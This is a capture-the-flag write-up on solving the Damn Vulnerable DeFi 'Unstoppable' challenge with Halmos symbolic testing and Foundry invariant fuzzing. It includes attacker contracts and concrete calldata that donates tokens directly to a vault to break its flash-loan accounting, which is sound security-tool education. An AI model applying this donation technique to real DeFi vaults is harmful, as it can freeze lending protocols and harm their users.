# Halmos vs Unstoppable 
## Halmos version
**halmos 0.2.1.dev16+g1502e46** was used in this article
## Idea overview
Let's imagine that we don't know how to solve this challenge. The only things we know are the code of contracts, pre-written `setUp()` function, final state we must achieve and the `test_unstoppable()` function, where we should write our solution.
The idea is:
1. Create some **SymbolicAttacker** contract, controlled by `player` and give it all necessary resources (**DamnValuableToken** supply).

2. **SymbolicAttacker** should be able to symbolically execute all known contracts with all possible parameters to find necessary state.

3. In `_isSolved()` function, write an `assert` opposite to the existing one. That means, if there is:
    ```solidity
    assertTrue(*Some condition*);
    ```
    we will change it to:
    ```solidity
    assertFalse(*Some condition*);
    ```
    so Halmos will find a counterexample where this condition is **true**. This will be our solution for the challenge.

4. Paste this counterexample into the initial code and execute **forge test**.

5. **forge test** should be passed.
## Common prerequisites
1. Copy **Unstoppable.t.sol** file to **Unstoppable_Halmos.t.sol**. All Halmos-related changes should be done here.

2. Since Halmos doesn't support 
    ```solidity
    vm.expectEmit()
    ```
    cheatcode, we simply delete this code.

3. Rename `test_unstoppable()` to `check_unstoppable()`, so Halmos will execute this test symbolically.
4. We should avoid using the `makeAddr()` cheatcode, because Halmos treats such addresses as symbolic, leading to incorrect counterexamples. Simply put, Halmos can assume that the `deployer` and the `player` have the same addresses (is the same person), which destroys the very essence of the challenge. So we have to replace `makeAddr()` with specific hardcoded values:
    ```solidity
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    ```
    by
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    ```
5. Halmos execution should be done without assertion timeout:
    ```
    halmos <...> --solver-timeout-assertion 0
    ```
## Deploying SymbolicAttacker contract
So, let's write our `check_unstoppable()` function:
```solidity
function  check_unstoppable() public  checkSolvedByPlayer {
    SymbolicAttacker attacker =  new SymbolicAttacker(); // Deploy attacker contract
    token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE); // Transfer necessary resources to attacker
    attacker.attack(); // execute symbolic attack
}
```
Pretty simple so far.
## SymbolicAttacker implementation
First of all, it should support symbolic execution and common forge cheatcodes. So let's import the necessary stuff:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";;
import "forge-std/Test.sol";
```

Since the basis of our idea is the symbolic execution of some transaction, which, as we assume, leads to a bug, the implementation of the attacking function looks like this:
```solidity
contract SymbolicAttacker is Test, SymTest {
    function attack() public {
        address target = svm.createAddress("target");
        bytes memory data = svm.createBytes(100, 'data');
        target.call(data);
    }
}
```
Let's break down the attack() function line by line:
1. Since we don't know which contract call is causing the bug, we work with target as some symbolic address
    ```solidity
    address target = svm.createAddress("target");
    ```
2. The situation is similar here - we do not know which function of the contract and with which parameters it should be called to trigger the bug, so we work with calldata as with symbolic values.
    ```solidity
    bytes memory data = svm.createBytes(100, 'data');
    ```
3. Finally, we got to the place where all the magic happens:
If you make a call to the symbolic address, Halmos will automatically process all known contracts by brute force. In this case, these are **DamnValuableToken**, **UnstoppableVault**, **UnstoppableMonitor** and, unexpectedly, **SymbolicAttacker** himself (we'll come back to this later). Accordingly, the symbolic calldata **data** will also be bruteforced as all possible entry points of contracts with corresponding symbolic parameters.
    ```solidity
    target.call(data);
    ```

## _isSolved() implementation and counterexample
This function is a check function that is executed immediately after `check_unstoppable()`. `attacker` has finished its work, so it's time to check the state and create a counterexample.
The original checks look like:
```solidity
function  _isSolved() private {
    ...
    // And now the monitor paused the vault and transferred ownership to deployer
    assertTrue(vault.paused(), "Vault is not paused");
    assertEq(vault.owner(), deployer, "Vault did not change owner");
}
```
Then the opposite check will look like this:
```solidity
function  _isSolved() private {
    ...
    assert(vault.paused() == false || vault.owner() != deployer);
}
```
Finally, execute it:
```bash
~$ halmos --function check_unstoppable --solver-timeout-assertion 0

....
```
Hooray! We received a number of very similar counterexamples. They appear one after another, so I had to stop the analysis process at some point. Let's analyze what happened here.
## Counterexamples analysis
### Dealing with multiple counterexamples
First of all, let's add logging to the beginning of the test execution. Let's look at the addresses of each of the deployed contracts:
```bash
function check_unstoppable() public  checkSolvedByPlayer {
        SymbolicAttacker attacker =  new SymbolicAttacker(); // Deploy attacker contract
        console.log("token\t", address(token));
        console.log("vault\t", address(vault));
        console.log("monitor\t", address(monitorContract));
        console.log("attacker\t", address(attacker));
        ...
```
And run again:
```bash
~$ halmos --function check_unstoppable --solver-timeout-assertion 0
...
Running 1 tests for test/unstoppable/Unstoppable_Halmos.t.sol:UnstoppableChallenge
[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] vault      0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] monitor    0x00000000000000000000000000000000000000000000000000000000aaaa0004
[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005         
```
Now we have address information. Let's briefly look at the first counterexample:
```solidity
halmos_data_bytes_2658b5c_02 = 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0002    
```
Here the `attacker` executed some transaction on the `token` contract, which led to the bug. Before studying it in more depth, it is necessary to consider other counterexamples:
```solidity
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005  
```
and
```solidity
halmos_data_bytes_2658b5c_02 = 0x9e5faafc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

halmos_data_bytes_9d914dc_06 =
0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000804013125f0000000000000000000000000000000000000000000000000000000000000000000000
halmos_target_address_cc8b1e9_03 = 0x00000000000000000000000000000000aaaa0005
halmos_target_address_d348a8b_05 = 0x00000000000000000000000000000000aaaa0002
halmos_target_address_dc9e083_01 = 0x00000000000000000000000000000000aaaa0005
```
Given that we already know that **0x0...aaaa0005** is the attacker's address, it is easy to guess that we are dealing with recursion. Attacker calls its own `attack()` function and thus inflates the analysis with spurious counterexamples. Fixing this is quite simple - just use the `vm.assume()` cheatcode when creating a symbolic address:
```solidity
function attack() public {
        address target = svm.createAddress("target");
        vm.assume (target != address(this)); // Avoid recursion
        ...
```
Now we've gotten rid of the recursive counterexamples and have only meaningful one.

### Calldata analysis

We already know that the attack is based on some transaction to the `token` address
```solidity
0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
```
It is easy to reveal the exact function and its parameters by using the **cast** command-line tool, provided by Foundry:
```bash
 cast 4byte-decode 0xa9059cbb00000000000000000000000000000000000000000000000000000000aaaa0003000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000
 1) "transfer(address,uint256)"
 0x00000000000000000000000000000000aaaA0003
 8372529336254726145 [8.372e18]                                   
```
Let's break down this calldata step by step:
```bash
 1) "transfer(address,uint256)"
```
So, this is just an **ERC20** `transfer()` function.
```bash
0x00000000000000000000000000000000aaaA0003
```
Obviously, this is the address of the vault contract.
```bash
 8372529336254726145 [8.372e18]
```
And the last parameter is amount to send.
As a result, we clarified everything: Attacker sends some tokens to `vault` contract and it should lead to flashloan error.
## Using of counterexample 
First of all, let's find all contract addresses in **forge**. We'll use the same console logging here and this is what we got:
```bash
~$ forge test -vv --mp test/unstoppable/Unstoppable.t.sol
...
Logs:
token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
vault          0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
monitor        0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5
  ...
```
Implement non-symbolic attacker contract:
```solidity

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";;
import "forge-std/Test.sol";

contract Attacker is Test, SymTest {
	function attack() public {
        address target = address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b);
        bytes memory data = hex"a9059cbb0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264000000000000000000000000000000000000000000000000743133125f0000010000000000000000000000000000000000000000000000000000000000000000";
        target.call(data);
    }
}
```
This is an exact copy of **SymbolicAttacker**, except we've replaced the symbolic values with concrete values ​​from the counterexample. 
And of course, we replaced the addresses from Halmos with Foundry addresses.

And `test_unstoppable()`:
```solidity
function test_unstoppable() public checkSolvedByPlayer {
        Attacker attacker = new Attacker();
        token.transfer(address(attacker), INITIAL_PLAYER_TOKEN_BALANCE);
        attacker.attack();
    }
```
Let's execute:
```bash
forge test -vv --mp test/unstoppable/Unstoppable.t.sol
...
Ran 2 tests for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
[PASS] test_assertInitialState() (gas: 57390)
[PASS] test_unstoppable() (gas: 899808)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.56ms 
Ran 1 test suite in 37.58ms (1.56ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests) 
```
Success! The challenge "Unstoppable" is solved successfully using Halmos symbolic testing.

## And what about fuzzing?
At the time of writing, [Echidna-driven](https://github.com/crytic/damn-vulnerable-defi-echidna/blob/solutions/contracts/unstoppable/UnstoppableEchidna.sol) solution by **Crytic team** and [Foundry-driven](https://github.com/devdacian/solidity-fuzzing-comparison/blob/main/test/02-unstoppable/UnstoppableBasicFoundry.t.sol) solution by **devdacian** can be found on the Internet. However, these solutions were made for older versions of "Unstoppable". The current version needs to check other invariants, so we will work with a modernized solution. Of course, I chose invariant-driven Foundry as my fuzzing engine since the current version of Damn-Vulnerable-Defi was completely rewritten on Foundry. 
### Invariant
The invariant is obvious - I just took the code of the `_isSolved()` function from **Unstoppable_Halmos.t.sol** and used it:
```solidity
function invariant_check_flash_loan() public {
    vm.prank(deployer);
    monitorContract.checkFlashLoan(100e18);
    // Foundry should generate counterexample here.
    // We expect it to find such a contract and data that sets the vault paused.
    assert(vault.paused() == false || vault.owner() != deployer);
}
```
### SetUp()
And the `SetUp()` was changed somewhat, where it was indicated that the attacking actor is only the `player`:
```solidity
function setUp() public {
...
    vm.stopPrank();
    targetSender(player);
}
```
### Fuzzing result
Let's launch our Unstoppable, changed to fuzzing:
```bash
~$ forge test -vvv --mp test/unstoppable/Unstoppable_Fuzz.t.sol
...

This method also quickly and simply found the attacking transaction.
## Conclusions
1. We proved that Halmos can be used to solve CTF problems. We had a simple one-transaction challenge and Halmos solved it in a rather intuitive and understandable way
2. Analyzing counterexamples can be tricky due to hard-coded addresses and parameters. We can't just put a counterexample in the source code and expect it to behave like it does inside Halmos
3. When we try to migrate a normal Foundry test to Halmos, we need to be careful not to use unsupported functionality from Foundry, or tricky cheatcodes like `makeAddr()`
4. Getting into recursion should be avoided as it can lead to spurious counterexamples or reduce code coverage
5. In the case of fairly simple problems with a trivial solution, the solution through fuzzing looks and is much simpler: writing it took ten times less time and effort than solving through Halmos. However, **!!!SPOILER ALERT!!!**, Halmos will show its power in the following less trivial challenges
